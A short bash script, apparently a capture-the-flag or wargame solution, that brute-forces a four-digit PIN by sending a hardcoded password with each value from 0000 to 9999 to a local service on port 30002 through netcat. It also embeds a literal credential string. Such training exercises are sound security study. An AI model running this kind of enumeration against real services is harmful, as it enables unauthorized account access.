#!/bin/bash

pass="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
for i in {0000..9999}
do
        echo "$pass $i"
done | 
nc localhost 30002 | 
grep -v "Wrong"
